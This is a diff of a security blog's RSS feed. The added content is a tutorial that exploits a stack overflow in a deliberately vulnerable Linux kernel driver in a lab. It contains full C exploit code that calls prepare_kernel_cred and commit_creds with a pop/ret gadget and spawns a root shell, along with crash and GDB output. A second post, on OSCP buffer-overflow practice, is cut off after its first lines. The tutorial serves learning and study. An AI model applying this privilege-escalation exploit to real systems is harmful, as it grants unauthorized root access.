@@ -1,33 +1,821 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Posts on D Hack</title>
-    <link>https://mdanilor.github.io/posts/</link>
-    <description>Recent content in Posts on D Hack</description>
-    <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Tue, 28 Apr 2020 18:01:34 -0300</lastBuildDate>
-    
-	<atom:link href="https://mdanilor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
-    
-    
-    <item>
-      <title>Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]</title>
-      <link>https://mdanilor.github.io/posts/hello-kernel/</link>
-      <pubDate>Tue, 28 Apr 2020 18:01:34 -0300</pubDate>
-      
-      <guid>https://mdanilor.github.io/posts/hello-kernel/</guid>
-      <description>Hello, Kernel Linux: Exploiting an intentionally vulnerable Linux driver [Part 1] Intro and setup About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</description>
-    </item>
-    
-    <item>
-      <title>Cracking an OSCP-like buffer overflow</title>
-      <link>https://mdanilor.github.io/posts/oscp-bof/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://mdanilor.github.io/posts/oscp-bof/</guid>
-      <description>So my OSCP PWK  lab starts next saturday. Throughout the last few months, I&amp;rsquo;ve been slowly preparing myself to start the lab. Solved dozens of CTF VMs on vulnhub and tryhackme. One VM that particularly caught my attention is hosted on TryHackMe  , a brilliant platform for security enthusiasts and professionals to practice their skills. This VM is Buffer Overflow Prep  , which, according to friends who have taken the exam, it&amp;rsquo;s pretty close to the OSCP exam BoF machine.</description>
-    </item>
-    
-  </channel>
+	<channel>
+		<title>Posts on Cebola Security</title>
+		<link>https://mdanilor.github.io/posts/</link>
+		<description>Recent content in Posts on Cebola Security</description>
+		<generator>Hugo -- gohugo.io</generator>
+		<language>en-us</language>
+		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+		<lastBuildDate>Tue, 28 Apr 2020 18:01:34 -0300</lastBuildDate>
+		<atom:link href="https://mdanilor.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Hello, kernel: Exploiting an intentionally vulnerable Linux driver [Part 1]</title>
+			<link>https://mdanilor.github.io/posts/hello-kernel/</link>
+			<pubDate>Tue, 28 Apr 2020 18:01:34 -0300</pubDate>
+			
+			<guid>https://mdanilor.github.io/posts/hello-kernel/</guid>
+			<description>Hello, Kernel Linux: Exploiting an intentionally vulnerable Linux driver [Part 1] Intro and setup About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</description>
+			<content type="html"><![CDATA[<h2 id="hello-kernel-linux-exploiting-an-intentionally-vulnerable-linux-driver-part-1">Hello, Kernel Linux: Exploiting an intentionally vulnerable Linux driver [Part 1]</h2>
+<h3 id="intro-and-setup">Intro and setup</h3>
+<p>About a month ago I started doing some research during both my freetime and work hours (shout out to SiDi for allowing me the time!!!) on Kernel Linux exploitation. I find this to be not only a fascinating topic, but a very useful one too, since one of my primary functions at work is to assess the Android system.</p>
+<p>Ok, so let&rsquo;s get started. By this time you should be at least a little familiar with C and stack overflow exploitation in userland. You should also have a Linux VM running on QEMU attached to GDB. If you don&rsquo;t know how to set this up, don&rsquo;t worry. I had no idea when I started this either. I&rsquo;ll leave you with two blogposts below, the first will show you how to set up a Linux VM on QEMU (it&rsquo;s the same setup I&rsquo;m using here) and the second will show how to attach GDB to it. In addition, I&rsquo;ll leave two more links which should get you familiar with basic kernel development. If you have never developed at least a &ldquo;hello&rdquo; driver or built your own kernel, you should start with these.</p>
+<ul>
+<li>[1] <a href="https://andrealmeid.com/post/2020-03-10-bootstrap-arch/">https://andrealmeid.com/post/2020-03-10-bootstrap-arch/</a></li>
+<li>[2] <a href="http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/">http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/</a></li>
+<li>[3] <a href="https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/">https://lkcamp.gitlab.io/lkcamp_docs/unicamp_group/boot/</a> - check as many tutorials as you can!</li>
+<li>[4] <a href="https://github.com/R3x/How2Kernel">https://github.com/R3x/How2Kernel</a> - Check out Labs 1 through 3.</li>
+</ul>
+<p>On my setup I&rsquo;m using archlinux 5.6.0+ with KASLR disabled. To disable it, just put <code>-append &quot;nokaslr&quot;</code> arg to your QEMU.
+I know that disabling KASLR is a bit of a turnoff. However, I will go back to bypassing KASLR in future posts. For this time, I&rsquo;ll keep it disabled since it&rsquo;s a beginners guide.</p>
+<h3 id="what-well-be-exploiting">What we&rsquo;ll be exploiting</h3>
+<p>After I took interest on Kernel exploitation, I started looking for some research material. Fortunately, I was able to find plenty of good stuff. I started reading the brilliant book &ldquo;A Guide to Kernel Exploitation: Attacking the Core&rdquo;, but decided to pause my reading for a more practical approach. This repository was an excelent place to start:</p>
+<p>[5] <a href="https://github.com/invictus-0x90/vulnerable_linux_driver">https://github.com/invictus-0x90/vulnerable_linux_driver</a></p>
+<p>As stated by the owner, this is not a CTF. Rather, the vulnerabilities are pretty obvious in order for one to focus on exploitation.</p>
+<p>So you should clone the repository and build it:
+<code>make -C &lt;PATH-TO-LINUX-SOURCE-CODE&gt; M=$(pwd)</code></p>
+<p>If you followed tonyk&rsquo;s tutorial on [1], you should have a shared folder between the host and the VM. That&rsquo;s where you should put the driver so you can load it from the VM.</p>
+<h3 id="part-1-stack-overflow">Part 1: stack overflow</h3>
+<p>In this repository, there are a few vulnerabilities to exploit (artibrary rw, UAF, etc). Today we&rsquo;ll be focusing on the stack overflow. In future posts I shall cover the other vulnerabilities in there, but let&rsquo;s stick with stack overflow for today as you may see the vulnerable code below:</p>
+<pre><code>	static int buffer_overflow(char __user *buff)
+        {
+                char kernel_buff[512];
+                size_t size;
+
+                size = strlen(buff);
+
+                printk(KERN_WARNING &quot;[x] Triggering buffer overflow [x]\n&quot;);
+
+                /**
+                * Pretty simple buffer overflow. We shouldnt be using memcpy to
+                * start with, copy_from_user does bounds checking for us (hence
+                * why its not used here).
+                */
+                memcpy(kernel_buff, buff, size);
+
+                return 0;
+	}
+</code></pre><p>This function may be called from userland by using ioctl. If you don&rsquo;t know what I&rsquo;m talking about, check links [2], [3] and [4] before proceeding.</p>
+<p>So we clearly have an overflow in the function above. The focus today will be on turning this buffer overflow into a privilege escalation.</p>
+<h3 id="the-stack">The stack</h3>
+<p>Since our example relies on a stack overflow, we should understand how the stack works.</p>
+<p>The stack is used to store, amongst other things, local statically alocated variables, register values and return addresses.</p>
+<p>When a function is called (using the x86 call instruction), the current RIP (instruction pointer register) on the caller function is stored in the stack so the callee will be able to know where to return to. In the callee function prologue, the base pointer is also stored in the stack so it can be later recovered in the prologue.</p>
+<p>Another notable aspect of the stack is that it grows from higher addresses to lower ones. So when you push two elements into the stack, the first element pushed should have a higher address than the second.</p>
+<p>Ok, so let&rsquo;s try and visualize it:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+ Top of the stack
+|                        | (Stack pointer)
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+ Base of the stack
+|                        | (Base pointer)
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>Here we see the stack during the execution of some A function. Let&rsquo;s supose now that the A function calls a B function. The following should happen:</p>
+<ul>
+<li>The A function call instruction should push the return address into the stack so when B executes the RET instruction, it pops the return address from memory and sets the instruction pointer register to it.</li>
+<li>The B function should push the base pointer into the stack so it can be restored upon return.</li>
+</ul>
+<p>The stack should look like this:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+Top of stack
+|                        |
+|  Function B Variables  |
+|                        |
++------------------------+Base of stack
+|  Previous base pointer |
++------------------------+
+|  Return address of A   |
++------------------------+
+|                        |
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+
+|                        |
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>So say there&rsquo;s a stack overflow in B. If the overflow is large enough, the attacker should be able to overwrite the previous base pointer and, more interestingly, the return address.</p>
+<p>By overwriting the return address, when function B executes the RET instruction, instead of returning to A, the flow will be redirected to wherever the overwritten address controlled by the attacker points to, causing a flow hijack.</p>
+<p>Time to get our hands dirty!</p>
+<h3 id="writing-our-exploit">Writing our exploit</h3>
+<p>First things first. Let&rsquo;s make sure that our driver is loaded.</p>
+<pre><code>[root@archlinux src]# insmod vuln_driver.ko
+[68216.283511] [!!!] use_stack_obj @00000000bcfc15f3 [!!!]
+[root@archlinux src]# ls /dev/vulnerable_device -lah
+crw-rw-rw- 1 root root 10, 61 Apr 28 14:04 /dev/vulnerable_device
+[root@archlinux src]# su guest
+[guest@archlinux src]$
+</code></pre><p>I inserted the module, made sure any user could write to or read from it (in /dev/vulnerable_device) and changed the user to an unprivileged one named guest. Let the fun begin!</p>
+<p>Let&rsquo;s write our first code which will simply overflow the buffer:</p>
+<pre><code>#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;../src/vuln_driver.h&quot;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LEN 512
+
+#define PAYLOAD_LEN BUF_LEN + 100
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    memset(payload, 'A', PAYLOAD_LEN);
+    payload[PAYLOAD_LEN] = '\0';
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>All this does is send 612 bytes to the driver buffer (which is allocated to fit only 512 bytes). When we run our exploit, this is what we get:</p>
+<pre><code>[guest@archlinux exploits]$ ./exploit
+[74193.913369] [x] Triggering buffer overflow of size 612 [x]
+[74193.914320] general protection fault: 0000 [#11] SMP PTI
+[74193.914798] CPU: 0 PID: 1782 Comm: exploit Tainted: G      D    O      5.6.0+ #3
+[74193.915452] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014
+[74193.916307] RIP: 0010:buffer_overflow+0x5c/0x5d [vuln_driver]
+[74193.916816] Code: 89 e0 48 89 c7 f3 a4 48 c7 c7 a0 10 00 c0 0f be b4 24 ff 01 00 00 e8 79 cb 0b c1 48 31 ff 48 81 7
+[74193.918446] RSP: 0018:ffffc900002f3ed8 EFLAGS: 00010246
+[74193.918904] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
+[74193.919524] RDX: 0000000000000000 RSI: ffff88813bc18968 RDI: 0000000000000000
+[74193.920144] RBP: 00007fffb1227e90 R08: ffffc900002f3b8d R09: 00000000000003bc
+[74193.920765] R10: ffffc900002f3b88 R11: ffffc900002f3b8d R12: 4141414141414141
+[74193.921385] R13: 00007fffb1227e90 R14: 0000000000000003 R15: ffff88813a18ef00
+[74193.922014] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[74193.922715] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[74193.923216] CR2: 00007f686d7961b8 CR3: 00000001375a2000 CR4: 00000000000006f0
+[74193.923841] Call Trace:
+[74193.924065]  ? __x64_sys_ioctl+0x11/0x20
+[74193.924414]  ? do_syscall_64+0x43/0x140
+[74193.924753]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[74193.925222] Modules linked in: vuln_driver(O) [last unloaded: vuln_driver]
+[74193.925870] ---[ end trace 37a63e690f3d98d4 ]---
+[74193.926385] RIP: 0010:0x3
+[74193.926719] Code: Bad RIP value.
+[74193.927022] RSP: 0018:ffffc90000343ef0 EFLAGS: 00010246
+[74193.927633] RAX: 0000000000000000 RBX: 4242424242424242 RCX: 0000000000000000
+[74193.928429] RDX: 0000000000000000 RSI: ffffffff82445440 RDI: ffff88813742dcc0
+[74193.929221] RBP: 000055af0edbc2b0 R08: ffff88813bc2d3a0 R09: ffff8881377c3b20
+[74193.929946] R10: 0000000000000400 R11: 00000000000d0800 R12: 4242424242424242
+[74193.930588] R13: 000055af0edbc2b0 R14: 0000000000000003 R15: ffff88813b0c1000
+[74193.931214] FS:  00007f686d798540(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
+[74193.931937] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[74193.932548] CR2: ffffffffffffffd9 CR3: 00000001375a2000 CR4: 00000000000006f0
+Segmentation fault
+
+</code></pre><p>Now, remember: we are trying to hijack the flow of the kernel module. To do that, we must overwrite the return address. It should be 16 bytes after the end of the buffer, since there are 8 bytes for the size variable and 8 bytes for the base pointer. Our payload is:</p>
+<p><code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [ADDRESS TO WHERE WE WISH TO HIJACK]</code></p>
+<p>To test this hypothesis, we could put the address of a function we know by the and of our payload and set a breakpoint in that function. If the breakpoint is hit, we should be certain that we are in the right path.</p>
+<p>The function I&rsquo;m going to choose to do this test is the prepare_kernel_cred function. We could have chosen at this point any function within the kernel, however I have chosen this one just because we&rsquo;re actually going to use it in the following section.</p>
+<p>So I&rsquo;ll pause the kernel in GDB and add the breakpoint:</p>
+<pre><code>(gdb) b *prepare_kernel_cred
+Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
+(gdb)
+</code></pre><p>Not only we put the breakpoint, but we find out that the address for that function is <code>0xffffffff8108e260</code>. The address was found using GDB, but in real life this is usually not possible. KASLR is also disabled in this environment, which is pretty unrealistic in real scenarios. For this moment, we&rsquo;ll stick with this <em>cheating</em> approach, but in future posts we should dive deeper into developing more robust exploits.</p>
+<p>With the address in mind, we modify the exploit to put it by the end of the payload.</p>
+<pre><code>#define BUF_LEN 512
+#define PADDING 16
+#define PAYLOAD_LEN BUF_LEN + PADDING + 8
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, 8);
+    payload[PAYLOAD_LEN] = '\0';
+    printf(&quot;Payload: %s\n&quot;, payload);
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>When the exploit has ran, we notice that it, in fact, DOES hit the breakpoint! That&rsquo;s great news!</p>
+<pre><code>(gdb) b *prepare_kernel_cred
+Breakpoint 5 at 0xffffffff8108e260: file kernel/cred.c, line 684.
+(gdb) c
+Continuing.
+
+Breakpoint 5, prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
+684		new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
+(gdb)
+</code></pre><p>Now we go back to why we chose this function for our test.</p>
+<h3 id="finding-a-good-gadget-chain-for-privilege-escalation">Finding a good gadget chain for privilege escalation</h3>
+<p>We are able to redirect the flow of execution to wherever we please throughout the kernel. The goal here is to escalate privileges to root. But how do we do that?</p>
+<p>In order to find that out, we must first learn how the kernel stores a process&rsquo; credentials.</p>
+<p>Every thread in Linux has information stored in a struct named task_struct. According to Linux&rsquo;s own documentation, task_struct holds a pointer to another struct named creds:</p>
+<p><code>In Linux, all of a task’s credentials are held in (uid, gid) or through (groups, keys, LSM security) a refcounted structure of type ‘struct cred’. Each task points to its credentials by a pointer called ‘cred’ in its task_struct.</code></p>
+<p>(<a href="https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials">https://www.kernel.org/doc/html/v4.14/security/credentials.html#types-of-credentials</a>)</p>
+<p>In fact, if one executes a <code>ptype struct task_struct</code> on GDB, the attribute is found:</p>
+<pre><code>(gdb) ptype struct task_struct
+type = struct task_struct {
+    struct thread_info thread_info;
+    volatile long state;
+    void *stack;
+(...)
+    const struct cred *cred;
+(...)
+
+
+</code></pre><p>We may also check out the cred struct while we are at it:</p>
+<pre><code>(gdb) ptype struct cred
+type = struct cred {
+    atomic_t usage;
+    kuid_t uid;
+    kgid_t gid;
+    kuid_t suid;
+    kgid_t sgid;
+    kuid_t euid;
+    kgid_t egid;
+    kuid_t fsuid;
+    kgid_t fsgid;
+(...)
+</code></pre><p>Notice the uid and gid attributes. If they are changed to zero, the process will be executed as root. The values of  <code>euid</code> and <code>egid</code> attributes (effective uid and effective gid) must also be altered for this to work. To our luck, this can be done by calling the <code>commit_creds(struct cred *)</code> function with a valid pointer to a root cred struct. The pointer can be obtained by calling the <code>prepare_kernel_cred(struct *task_struct)</code> with a NULL value to its argument. Hence, the following function call must be made: <code>commit_creds(prepare_kernel_cred(NULL))</code>.</p>
+<p>(This is why our example function was prepare_kernel_cred!)</p>
+<p>Finally, we must also make sure that after the two functions execute, the stack and the registers will be in a good enough state for the driver to gracefully exit and return to userland without a crash. If we get privilege escalation along with a kernel panic or a program crash, it would all have been for nothing.</p>
+<h3 id="crafting-our-payload">Crafting our payload</h3>
+<p>So far we managed to redirect the execution flow to the prepare_kernel_cred function. As we hit the breakpoint, we may see the stack state and the registers as soon as we enter the function:</p>
+<pre><code>(gdb) info registers
+rax            0x0                 0
+rbx            0x4141414141414141  4702111234474983745
+rcx            0x0                 0
+rdx            0x0                 0
+rsi            0xffff88813bc18968  -131386342012568
+rdi            0x0                 0
+rbp            0x7ffdd3e39710      0x7ffdd3e39710
+rsp            0xffffc90000313ee0  0xffffc90000313ee0
+r8             0xffffc90000313b8d  -60473136301171
+r9             0x44f               1103
+r10            0xffffc90000313b88  -60473136301176
+r11            0xffffc90000313b8d  -60473136301171
+r12            0x4141414141414141  4702111234474983745
+r13            0x7ffdd3e39710      140728158361360
+r14            0x3                 3
+r15            0xffff88813a1a0500  -131386369768192
+rip            0xffffffff8108e260  0xffffffff8108e260 &lt;prepare_kernel_cred&gt;
+</code></pre><pre><code>(gdb) info stack
+#0  prepare_kernel_cred (daemon=0x0 &lt;fixed_percpu_data&gt;) at kernel/cred.c:684
+#1  0x00007ffdd3e39710 in ?? ()
+#2  0x0000000000000003 in fixed_percpu_data ()
+#3  0x000000008008fe01 in ?? ()
+#4  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
+#5  ksys_ioctl (fd=3, cmd=3554907920, arg=140728158361360) at fs/ioctl.c:763
+#6  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:772
+#7  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
+#8  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
+#9  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000313f58) at arch/x86/entry/common.c:295
+#10 0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
+#11 0x0000000000000000 in ?? ()
+</code></pre><p>If you check out the calling convention for x86_64 Linux, you&rsquo;ll see that RDI is used to pass the first argument on a function call. That&rsquo;s great news, since RDI is already zero when the prepare_kernel_cred function is called (and, as you may remember, the parameter needed to be NULL).</p>
+<p>You may check the calling convention here: <a href="https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions">https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions</a></p>
+<p>We see plenty of return addresses in the stack. We must preserve them if we want to avoid a system crash or a kernel oops. Fortunately, we have room to work with before we start messing with these return addresses.</p>
+<p>While preserving the return addresses, we should add one address of our own: the commmit_creds address. So our payload will not be:
+<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] </code></p>
+<p>Since there&rsquo;s no KASLR here, the address for commit_creds can be found by putting a breakpoint into it. As root, one may also get it from /proc/kallsys.</p>
+<pre><code> (gdb) b commit_creds
+Breakpoint 7 at 0xffffffff8108de20: file ./arch/x86/include/asm/current.h, line 15.
+</code></pre><p>So the breakpoint is set. Let&rsquo;s see what happens. Below is the code with the commit_creds address added to it:</p>
+<pre><code>#define BUF_LEN 512
+#define PADDING 16
+#define INTLEN 8
+#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN
+
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff}
+
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    char commit_creds[] = COMMIT_CREDS_ADDR;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
+    payload[PAYLOAD_LEN] = '\0';
+    printf(&quot;Payload: %s\n&quot;, payload);
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+}
+</code></pre><p>We run and it hits the first breakpoint in prepare_kernel_creds. As we continue, it hits the second breakpoint in commit_creds. As we print the registers state, we find this:</p>
+<pre><code>Breakpoint 7, commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
+15		return this_cpu_read_stable(current_task);
+(gdb) i r
+rax            0xffff88813a2dcf00  -131386368471296
+rbx            0x4141414141414141  4702111234474983745
+rcx            0x0                 0
+rdx            0xffff8881375040c0  -131386416545600
+rsi            0x0                 0
+rdi            0xffff88813a2dcf00  -131386368471296
+rbp            0x7ffcdbcdb320      0x7ffcdbcdb320
+rsp            0xffffc90000333ee8  0xffffc90000333ee8
+r8             0xffff88813bc2d3a0  -131386341928032
+r9             0xffff8881375040c0  -131386416545600
+r10            0x400               1024
+r11            0x5d000             380928
+r12            0x4141414141414141  4702111234474983745
+r13            0x7ffcdbcdb320      140723996177184
+r14            0x3                 3
+r15            0xffff88813a193000  -131386369822720
+rip            0xffffffff8108de20  0xffffffff8108de20 &lt;commit_creds&gt;
+eflags         0x202               [ IOPL=0 IF ]
+
+</code></pre><p>Following the calling convention, the return value of a function is provided in the RAX register. It is very fortunate that RAX is equals to RDI, which means that the argument register has already been set to the credentials pointer somewhere along the way. It seems that we are ready to go!</p>
+<p>However, after continuing the program I get a crash.</p>
+<p>Running it again and looking at the stack at the moment the commit creds function is called, we notice this:</p>
+<pre><code>(gdb) i s
+#0  commit_creds (new=0xffff88813a2dcf00) at ./arch/x86/include/asm/current.h:15
+#1  0x0000000000000003 in fixed_percpu_data ()
+#2  0x000000008008fe01 in ?? ()
+#3  0xffffffff811ee992 in vfs_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at fs/ioctl.c:47
+#4  ksys_ioctl (fd=3, cmd=3687691040, arg=140723996177184) at fs/ioctl.c:763
+#5  0xffffffff811ee9e1 in __do_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;)
+    at fs/ioctl.c:772
+#6  __se_sys_ioctl (arg=&lt;optimized out&gt;, cmd=&lt;optimized out&gt;, fd=&lt;optimized out&gt;) at fs/ioctl.c:770
+#7  __x64_sys_ioctl (regs=&lt;optimized out&gt;) at fs/ioctl.c:770
+#8  0xffffffff81002883 in do_syscall_64 (nr=&lt;optimized out&gt;, regs=0xffffc90000333f58) at arch/x86/entry/common.c:295
+#9  0xffffffff81c0008c in entry_SYSCALL_64 () at arch/x86/entry/entry_64.S:175
+#10 0x0000000000000000 in ?? ()
+</code></pre><p>At #1 and #2, there&rsquo;s garbage for all our purposes, as these are definetly not return addresses. Nevertheless, not everything is lost: the return addresses are intact from #3 onwards. What we have to do is get rid of #1 and #2.</p>
+<p>To do that we need to find a gadget which does a stack POP and a RET and put the gadget address on #1. The POP will get rid of #2 and RET will (hopefully) return the flow to normal. There are several ways to look for gadgets. Given the simplicity of this gadget, we should be able find it in any function we search for. A simple disassemble of prepare_kernel_creds itself will sufice:</p>
+<pre><code>(...)
+   0xffffffff8108e342 &lt;+226&gt;:	pop    %r12
+   0xffffffff8108e344 &lt;+228&gt;:	retq
+</code></pre><p>Perfect! Just what we needed. So we update our payload:
+<code>[BUFFER - 512 bytes] + [PADDING - 16 bytes] + [PREPARE_KERNEL_CRED] + [COMMIT_CREDS] + [0xffffffff8108e342]</code></p>
+<p>Also, we put a <code>system(&quot;/bin/sh&quot;)</code> into the exploit to spawn a shell after privileges are escalated.
+Our final exploit looks like this:</p>
+<pre><code>#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &quot;../src/vuln_driver.h&quot;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LEN 512
+#define PADDING 16
+#define INTLEN 8
+#define PAYLOAD_LEN BUF_LEN + PADDING + INTLEN + INTLEN + INTLEN
+
+
+#define PREPARE_KERNEL_CRED_ADDR { 0x60, 0xe2, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define COMMIT_CREDS_ADDR { 0x20, 0xde, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+#define GADGET { 0x42, 0xe3, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff }
+
+int main()
+{
+    //Opening the vulnerable device
+    char fd = open(&quot;/dev/vulnerable_device&quot;, O_RDWR);
+    //Payload is set do A's
+    char payload[PAYLOAD_LEN+1];
+    char prepare_kernel_cred[] = PREPARE_KERNEL_CRED_ADDR;
+    char commit_creds[] = COMMIT_CREDS_ADDR;
+    char gadget[] = GADGET;
+    memset(payload, 'A', BUF_LEN + PADDING);
+    memcpy(payload + BUF_LEN + PADDING, prepare_kernel_cred, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN, commit_creds, INTLEN);
+    memcpy(payload + BUF_LEN + PADDING + INTLEN + INTLEN, gadget, INTLEN);
+    payload[PAYLOAD_LEN] = '\0';
+    //Sending payload to overflow function
+    ioctl(fd, BUFFER_OVERFLOW, payload);
+    //Releasing the device's FD.
+    close(fd);
+    system(&quot;/bin/sh&quot;);
+}
+</code></pre><p>If everything goes according to plan, it should redirect the exploit&rsquo;s flow to prepare_kernel_cred, then commit the creds generated, do some cleaning up and returning normally to userland.</p>
+<p>And the result is:</p>
+<pre><code>[guest@archlinux exploits]$ id
+uid=1000(guest) gid=1000(guest) groups=1000(guest)
+[guest@archlinux exploits]$ ./exploit
+[75008.865785] [x] Triggering buffer overflow of size 552 [x]
+[75008.866893] VFS: Close: file count is 0
+sh-5.0# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><h3 id="conclusion">Conclusion</h3>
+<p>We exploited a stack overflow vulnerability with KASLR disabled on Kernel 5.18. We have seen in this post how the kernel stores the task&rsquo;s credentials and one way to change it to escalate privileges. I hope this was a useful example of kernel exploitation for beginners. In future work we will cover how to exploit other vulnerabilities as well as bypassing the KALSR mitigations. Thanks for reading =)</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Cracking an OSCP-like buffer overflow</title>
+			<link>https://mdanilor.github.io/posts/oscp-bof/</link>
+			<pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+			
+			<guid>https://mdanilor.github.io/posts/oscp-bof/</guid>
+			<description>So my OSCP PWK lab starts next saturday. Throughout the last few months, I&amp;rsquo;ve been slowly preparing myself to start the lab. Solved dozens of CTF VMs on vulnhub and tryhackme. One VM that particularly caught my attention is hosted on TryHackMe, a brilliant platform for security enthusiasts and professionals to practice their skills. This VM is Buffer Overflow Prep, which, according to friends who have taken the exam, it&amp;rsquo;s pretty close to the OSCP exam BoF machine.</description>
+			<content type="html"><![CDATA[<p>So my <a href="https://www.offensive-security.com/pwk-oscp/">OSCP PWK</a> lab starts next saturday. Throughout the last few months, I&rsquo;ve been slowly
+preparing myself to start the lab. Solved dozens of CTF VMs on vulnhub and tryhackme. One
